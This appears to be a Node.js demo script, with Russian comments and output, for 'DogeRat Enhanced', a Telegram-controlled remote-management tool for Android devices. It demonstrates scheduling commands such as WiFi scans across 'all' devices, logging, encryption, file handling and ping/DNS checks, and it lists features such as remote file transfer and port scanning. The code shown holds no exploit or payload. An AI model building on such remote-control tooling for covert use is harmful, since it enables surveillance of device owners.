#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

// Импорт модулей
const TaskScheduler = require('./modules/scheduler');
const SecurityManager = require('./modules/security');
const FileManager = require('./modules/fileManager');
const NetworkTools = require('./modules/networkTools');

// Цвета для консоли
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

class EnhancedDemo {
    constructor() {
        this.scheduler = new TaskScheduler();
        this.security = new SecurityManager();
        this.fileManager = new FileManager();
        this.networkTools = new NetworkTools();
    }

    // Показать логотип
    showLogo() {
        console.clear();
        console.log(`${colors.cyan}${colors.bright}
╔══════════════════════════════════════════════════════════════╗
║                    DOGERAT ENHANCED DEMO                    ║
║                                                              ║
║  🚀 Демонстрация новых возможностей                          ║
║  🔧 Расширенные инструменты для разработки                   ║
║  📱 Удаленное управление через Telegram                      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
${colors.reset}\n`);
    }

    // Демонстрация планировщика задач
    async demoScheduler() {
        console.log(`${colors.yellow}📅 ДЕМОНСТРАЦИЯ ПЛАНИРОВЩИКА ЗАДАЧ${colors.reset}\n`);

        // Создание тестовых задач
        const tasks = [
            {
                name: 'Проверка батареи',
                command: 'get_battery_status',
                schedule: 30, // каждые 30 минут
                deviceId: 'all'
            },
            {
                name: 'Системная информация',
                command: 'get_system_info',
                schedule: 60, // каждый час
                deviceId: 'device_001'
            },
            {
                name: 'Сканирование WiFi',
                command: 'wifi_scan',
                schedule: 120, // каждые 2 часа
                deviceId: 'all'
            }
        ];

        console.log(`${colors.green}✅ Создание задач:${colors.reset}`);
        tasks.forEach(taskData => {
            const task = this.scheduler.createTask(
                taskData.name,
                taskData.command,
                taskData.schedule,
                taskData.deviceId
            );
            console.log(`   📋 ${task.name} (ID: ${task.id})`);
        });

        console.log(`\n${colors.blue}📊 Статистика планировщика:${colors.reset}`);
        console.log(`   • Всего задач: ${this.scheduler.getAllTasks().length}`);
        console.log(`   • Активных задач: ${this.scheduler.getAllTasks().filter(t => t.enabled).length}`);

        console.log(`\n${colors.cyan}📋 Список задач:${colors.reset}`);
        console.log(this.scheduler.formatTasksForDisplay());
    }

    // Демонстрация системы безопасности
    async demoSecurity() {
        console.log(`${colors.yellow}🔒 ДЕМОНСТРАЦИЯ СИСТЕМЫ БЕЗОПАСНОСТИ${colors.reset}\n`);

        // Генерация тестовых событий
        this.security.logSecurityEvent('DEVICE_CONNECTED', 'New device connected from 192.168.1.100', 'info');
        this.security.logSecurityEvent('SUSPICIOUS_COMMAND', 'Attempt to execute dangerous command', 'warning');
        this.security.logSecurityEvent('FAILED_LOGIN', 'Failed authentication attempt', 'critical');

        // Тестирование блокировки IP
        console.log(`${colors.green}✅ Тестирование блокировки IP:${colors.reset}`);
        this.security.recordFailedAttempt('192.168.1.50');
        this.security.recordFailedAttempt('192.168.1.50');
        this.security.recordFailedAttempt('192.168.1.50');
        console.log(`   🚫 IP 192.168.1.50 заблокирован: ${this.security.isIPBlocked('192.168.1.50')}`);

        // Шифрование данных
        console.log(`\n${colors.green}✅ Тестирование шифрования:${colors.reset}`);
        const testData = 'Секретные данные для шифрования';
        const encrypted = this.security.encrypt(testData);
        if (encrypted) {
            console.log(`   🔐 Данные зашифрованы: ${encrypted.encryptedData.substring(0, 20)}...`);
            const decrypted = this.security.decrypt(encrypted.encryptedData, encrypted.iv);
            console.log(`   🔓 Данные расшифрованы: ${decrypted}`);
        }

        // Отчет безопасности
        console.log(`\n${colors.cyan}📊 Отчет безопасности:${colors.reset}`);
        console.log(this.security.formatSecurityReportForTelegram());
    }

    // Демонстрация файлового менеджера
    async demoFileManager() {
        console.log(`${colors.yellow}📁 ДЕМОНСТРАЦИЯ ФАЙЛОВОГО МЕНЕДЖЕРА${colors.reset}\n`);

        // Создание тестовой структуры
        const testDir = path.join(__dirname, 'demo_files');
        if (!fs.existsSync(testDir)) {
            fs.mkdirSync(testDir, { recursive: true });
        }

        // Создание тестовых файлов
        const testFiles = [
            { name: 'test.txt', content: 'Тестовый файл' },
            { name: 'config.json', content: '{"test": true}' },
            { name: 'readme.md', content: '# Тестовый README' }
        ];

        console.log(`${colors.green}✅ Создание тестовых файлов:${colors.reset}`);
        testFiles.forEach(file => {
            const filePath = path.join(testDir, file.name);
            fs.writeFileSync(filePath, file.content);
            console.log(`   📄 ${file.name}`);
        });

        // Список файлов
        console.log(`\n${colors.blue}📂 Содержимое директории:${colors.reset}`);
        const files = this.fileManager.listFiles(testDir);
        console.log(this.fileManager.formatFileListForTelegram(files, 'demo_files'));

        // Поиск файлов
        console.log(`\n${colors.cyan}🔍 Поиск файлов по расширению .txt:${colors.reset}`);
        const searchResults = this.fileManager.searchFiles(testDir, '.txt');
        console.log(this.fileManager.formatSearchResultsForTelegram(searchResults, '.txt'));

        // Информация о файле
        console.log(`\n${colors.magenta}ℹ️  Информация о файле:${colors.reset}`);
        const fileInfo = this.fileManager.getFileInfo(path.join(testDir, 'test.txt'));
        if (fileInfo) {
            console.log(`   📄 Имя: ${fileInfo.name}`);
            console.log(`   📏 Размер: ${this.fileManager.formatFileSize(fileInfo.size)}`);
            console.log(`   📅 Изменен: ${fileInfo.modified.toLocaleString()}`);
        }

        // Очистка
        fs.rmSync(testDir, { recursive: true, force: true });
        console.log(`\n${colors.yellow}🧹 Тестовые файлы удалены${colors.reset}`);
    }

    // Демонстрация сетевых инструментов
    async demoNetworkTools() {
        console.log(`${colors.yellow}🌐 ДЕМОНСТРАЦИЯ СЕТЕВЫХ ИНСТРУМЕНТОВ${colors.reset}\n`);

        // Ping тест
        console.log(`${colors.green}✅ Ping тест:${colors.reset}`);
        try {
            const pingResult = await this.networkTools.ping('8.8.8.8', 3);
            console.log(this.networkTools.formatPingForTelegram(pingResult));
        } catch (error) {
            console.log(`   ❌ Ошибка ping: ${error.message}`);
        }

        // DNS lookup
        console.log(`\n${colors.blue}🌐 DNS lookup:${colors.reset}`);
        try {
            const dnsResult = await this.networkTools.dnsLookup('google.com');
            console.log(this.networkTools.formatDnsForTelegram(dnsResult));
        } catch (error) {
            console.log(`   ❌ Ошибка DNS: ${error.message}`);
        }

        // Информация о сети
        console.log(`\n${colors.cyan}📡 Информация о сети:${colors.reset}`);
        try {
            const networkInfo = await this.networkTools.getNetworkInfo();
            if (networkInfo.success) {
                console.log(`   🖥️  Hostname: ${networkInfo.hostname}`);
                console.log(`   💻 Platform: ${networkInfo.platform}`);
                console.log(`   🏗️  Architecture: ${networkInfo.arch}`);
                console.log(`   🌐 Interfaces: ${Object.keys(networkInfo.interfaces).join(', ')}`);
            }
        } catch (error) {
            console.log(`   ❌ Ошибка получения сетевой информации: ${error.message}`);
        }

        // Проверка URL
        console.log(`\n${colors.magenta}🔗 Проверка URL:${colors.reset}`);
        try {
            const urlResult = await this.networkTools.checkUrl('https://httpbin.org/status/200');
            if (urlResult.success) {
                console.log(`   ✅ URL доступен`);
                console.log(`   📊 Статус: ${urlResult.statusCode} ${urlResult.statusMessage}`);
                console.log(`   ⏱️  Время ответа: ${urlResult.responseTime}ms`);
            } else {
                console.log(`   ❌ URL недоступен: ${urlResult.error}`);
            }
        } catch (error) {
            console.log(`   ❌ Ошибка проверки URL: ${error.message}`);
        }
    }

    // Демонстрация интеграции
    async demoIntegration() {
        console.log(`${colors.yellow}🔗 ДЕМОНСТРАЦИЯ ИНТЕГРАЦИИ МОДУЛЕЙ${colors.reset}\n`);

        // Создание задачи с использованием сетевых инструментов
        console.log(`${colors.green}✅ Создание задачи мониторинга сети:${colors.reset}`);
        const networkTask = this.scheduler.createTask(
            'Мониторинг Google DNS',
            'ping:8.8.8.8',
            15, // каждые 15 минут
            'all'
        );
        console.log(`   📋 Задача создана: ${networkTask.name}`);

        // Логирование события безопасности при создании задачи
        this.security.logSecurityEvent(
            'TASK_CREATED',
            `Network monitoring task created: ${networkTask.name}`,
            'info'
        );

        // Создание резервной копии конфигурации
        console.log(`\n${colors.blue}💾 Создание резервной копии:${colors.reset}`);
        const configPath = path.join(__dirname, 'config', 'enhanced_config.json');
        if (fs.existsSync(configPath)) {
            const backupPath = this.security.createBackup(configPath);
            if (backupPath) {
                console.log(`   ✅ Резервная копия создана: ${path.basename(backupPath)}`);
            }
        }

        // Статистика всех модулей
        console.log(`\n${colors.cyan}📊 Общая статистика:${colors.reset}`);
        console.log(`   📅 Задач в планировщике: ${this.scheduler.getAllTasks().length}`);
        console.log(`   🔒 События безопасности: ${this.security.getSecurityStats().totalLogs}`);
        console.log(`   📁 Поддерживаемые расширения: ${this.fileManager.allowedExtensions.length}`);
        console.log(`   🌐 Сетевые инструменты: Активны`);
    }

    // Показать возможности для разработки
    showDevelopmentFeatures() {
        console.log(`${colors.yellow}👨‍💻 ВОЗМОЖНОСТИ ДЛЯ РАЗРАБОТКИ${colors.reset}\n`);

        const features = [
            {
                category: '🔧 Системные инструменты',
                items: [
                    'Мониторинг производительности в реальном времени',
                    'Детальная информация о системе и железе',
                    'Управление процессами и приложениями',
                    'Контроль энергопотребления и температуры'
                ]
            },
            {
                category: '📁 Файловый менеджер',
                items: [
                    'Полноценный браузер файловой системы',
                    'Загрузка и скачивание файлов через Telegram',
                    'Поиск файлов по различным критериям',
                    'Управление правами доступа и атрибутами'
                ]
            },
            {
                category: '🌐 Сетевые инструменты',
                items: [
                    'Комплексная диагностика сети',
                    'Сканирование портов и сервисов',
                    'Мониторинг сетевого трафика',
                    'Анализ DNS и маршрутизации'
                ]
            },
            {
                category: '⏰ Автоматизация',
                items: [
                    'Гибкий планировщик задач',
                    'Триггеры на основе событий',
                    'Макросы и последовательности команд',
                    'Условная логика выполнения'
                ]
            },
            {
                category: '🔒 Безопасность',
                items: [
                    'Шифрование данных AES-256',
                    'Система логирования и аудита',
                    'Защита от атак и вторжений',
                    'Автоматическое резервное копирование'
                ]
            },
            {
                category: '📊 Мониторинг',
                items: [
                    'Детальная аналитика использования',
                    'Автоматические отчеты и уведомления',
                    'Визуализация данных и трендов',
                    'Алерты о критических событиях'
                ]
            }
        ];

        features.forEach(category => {
            console.log(`${colors.cyan}${category.category}${colors.reset}`);
            category.items.forEach(item => {
                console.log(`   • ${item}`);
            });
            console.log('');
        });

        console.log(`${colors.green}🚀 Преимущества для разработки:${colors.reset}`);
        console.log(`   • Быстрое тестирование на реальных устройствах`);
        console.log(`   • Удаленная отладка и диагностика`);
        console.log(`   • Автоматизация рутинных задач`);
        console.log(`   • Мониторинг производительности приложений`);
        console.log(`   • Безопасное управление тестовыми устройствами`);
        console.log(`   • Интеграция с CI/CD процессами`);
    }

    // Главный метод демонстрации
    async run() {
        this.showLogo();

        console.log(`${colors.green}🎯 Добро пожаловать в демонстрацию DogeRat Enhanced!${colors.reset}\n`);
        console.log(`${colors.blue}Эта демонстрация покажет новые возможности для удаленного управления${colors.reset}`);
        console.log(`${colors.blue}Android устройствами через Telegram бот.${colors.reset}\n`);

        try {
            // Демонстрация каждого модуля
            await this.demoScheduler();
            console.log(`\n${'='.repeat(60)}\n`);

            await this.demoSecurity();
            console.log(`\n${'='.repeat(60)}\n`);

            await this.demoFileManager();
            console.log(`\n${'='.repeat(60)}\n`);

            await this.demoNetworkTools();
            console.log(`\n${'='.repeat(60)}\n`);

            await this.demoIntegration();
            console.log(`\n${'='.repeat(60)}\n`);

            this.showDevelopmentFeatures();

            console.log(`${colors.green}✅ Демонстрация завершена успешно!${colors.reset}\n`);
            console.log(`${colors.yellow}📚 Для получения дополнительной информации:${colors.reset}`);
            console.log(`   • Прочитайте README_ENHANCED.md`);
            console.log(`   • Запустите: node start_enhanced.js`);
            console.log(`   • Изучите конфигурацию в config/enhanced_config.json`);

        } catch (error) {
            console.error(`${colors.red}❌ Ошибка демонстрации: ${error.message}${colors.reset}`);
        }
    }
}

// Запуск демонстрации
if (require.main === module) {
    const demo = new EnhancedDemo();
    demo.run().catch(error => {
        console.error(`Критическая ошибка: ${error.message}`);
        process.exit(1);
    });
}

module.exports = EnhancedDemo;